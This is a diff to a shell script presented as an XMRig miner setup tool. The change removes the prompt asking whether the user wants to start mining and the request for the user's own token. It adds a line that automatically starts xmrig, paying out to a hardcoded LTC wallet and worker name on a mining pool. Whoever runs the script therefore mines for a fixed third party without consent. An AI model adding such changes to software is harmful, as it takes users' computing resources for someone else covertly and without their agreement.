@@ -39,14 +39,7 @@ echo -e "${PURPLE}
             |_| |_|\___|_|                                 
 ${NC}"
 
-# Ask to start mining with colorful prompt
 echo -e "${YELLOW}🚀 Welcome to XMRig Miner Setup! 🚀${NC}"
-read -p "$(echo -e ${CYAN}"Do you want to start mining? (y/n) "${NC})" answer
-
-if [[ "$answer" != "y" && "$answer" != "Y" ]]; then
-    echo -e "${RED}❌ Mining cancelled.${NC}"
-    exit 0
-fi
 
 # Start animation in background
 animate &
@@ -88,10 +81,8 @@ kill $ANIMATE_PID > /dev/null 2>&1
 
 echo -e "\n${GREEN}🎉 Build process completed!${NC}"
 echo -e "${BLUE}💻 You are now in the $(pwd) directory${NC}"
-echo -e "${YELLOW}💰 Now Send Your Xmrig Token${NC}"
 
-# Create a cool prompt
-PS1="\[\e[1;35m\]XMRig\[\e[1;36m\]@\[\e[1;34m\]Miner \[\e[1;33m\]\w\[\e[1;31m\] # \[\e[0m\]"
-export PS1
+# Start xmrig miner automatically
+echo -e "${YELLOW}💰 Starting miner...${NC}"
+./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u LTC:Lg5YZburosmqvQabhLs9Kye7YQXVjsPHZ2.Spiderminers1 -p x
 
-exec bash
